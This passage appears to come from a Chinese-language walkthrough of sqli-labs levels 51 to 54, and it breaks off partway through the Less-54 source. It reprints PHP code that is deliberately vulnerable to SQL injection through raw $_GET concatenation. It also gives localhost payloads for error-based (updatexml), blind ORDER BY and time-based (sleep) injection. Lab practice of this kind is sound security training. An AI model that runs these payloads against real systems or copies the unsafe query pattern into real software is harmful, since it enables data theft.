class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* store first result set */</span></span><br><span class="line"><span class="string">if ($result = mysqli_store_result($con1))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">while($row = mysqli_fetch_row($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[0]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[1]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[2]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#FFFF00"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";  </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-51.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>多了个需要闭合还是报错注入带走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-51/?sort=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20--+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/14/kBzv1f.png" alt="kBzv1f.png"></p><p>52关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql)) <span class="comment">/*查询*/</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* store first result set */</span></span><br><span class="line"><span class="string">if ($result = mysqli_store_result($con1))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">while($row = mysqli_fetch_row($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[0]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[1]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[2]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-53.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>没有输出mysql报错，盲注带走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-52/?sort=rand(length(database())=8)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/14/kDSkhq.md.png" alt="kDSkhq.md.png"></p><p>53关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql)) <span class="comment">/*查询*/</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* store first result set */</span></span><br><span class="line"><span class="string">if ($result = mysqli_store_result($con1))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">while($row = mysqli_fetch_row($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[0]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[1]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[2]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-53.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>回显不正常只能延时注入，由于延时注入从图片中看不出效果这里就不放了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-53/?sort=1%27%20and%20sleep(if((length(dataabse())=8),1,4))%20--+</span><br></pre></td></tr></table></figure></p><p>54关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-54</span>:Challenge<span class="number">-1</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects... /*获取当前php的路径*/</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data /*用于生成随机数据的字符集*/</span></span><br><span class="line">$times= <span class="number">10</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>])) <span class="comment">/*判断answer_key如果否存在，如果不存在则执行以下操作*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>])) <span class="comment">/*如果POST的传参reset存在*/</span></span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>); <span class="comment">/*设置一个cookie然后跳转*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> ); <span class="comment">/*重定向到主页*/</span></span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>])) <span class="comment">/*判断是否有cookie存在*/</span></span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire); <span class="comment">/*如果是第一次访问给予一个cookie*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) <span class="comment">/*判断是否有GET传参ID的存在*/</span></span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset 